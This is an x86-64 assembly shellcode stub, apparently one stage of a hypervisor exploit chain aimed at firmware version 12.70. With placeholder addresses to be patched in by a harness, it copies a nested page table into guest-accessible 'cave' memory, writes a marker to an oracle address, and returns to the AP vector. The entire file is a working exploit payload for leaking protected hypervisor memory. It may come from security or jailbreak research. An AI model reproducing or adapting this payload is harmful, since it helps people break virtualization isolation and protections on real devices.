.intel_syntax noprefix
.text
.global shellcode
.type shellcode, @function

// Read one root-0 NPT table into an unused guest data-cave page, then
// return to the stock AP vector. The four sentinel immediates are patched
// by the 12.70 harness. No NPT entry is modified.
shellcode:
    lea     rsp, [rip + 0xef9]          // page + 0xf00, unused by this stub
    push    rsi
    push    rdi
    movabs  rsi, 0x1111111111111111   // source NPT table VA
    movabs  rdi, 0x2222222222222222   // guest cave output VA
    mov     ecx, 512
    cld
    rep movsq
    pop     rdi
    pop     rsi
    movabs  rdx, 0x1270a9e17e5e0002  // AP marker
    movabs  rax, 0x3333333333333333   // oracle VA
    mov     qword ptr [rax], rdx
    movabs  rcx, 0x4444444444444444   // stock AP vector
    jmp     rcx
.size shellcode, .-shellcode
